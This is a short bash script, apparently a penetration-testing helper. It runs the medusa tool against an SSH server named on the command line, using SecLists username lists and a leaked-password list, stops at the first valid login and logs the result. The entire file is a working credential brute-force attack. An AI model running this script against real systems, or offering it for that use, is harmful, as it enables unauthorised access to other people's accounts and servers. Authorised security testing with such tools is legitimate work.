#!/bin/bash

if [ $# -eq 2 ]; then
    medusa -v 4 -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -f -e ns -n $2 -O "ssh_$1_$2_medusa.txt" -M ssh -h $1
else
    echo "Please provide the target SSH server and its port."
fi
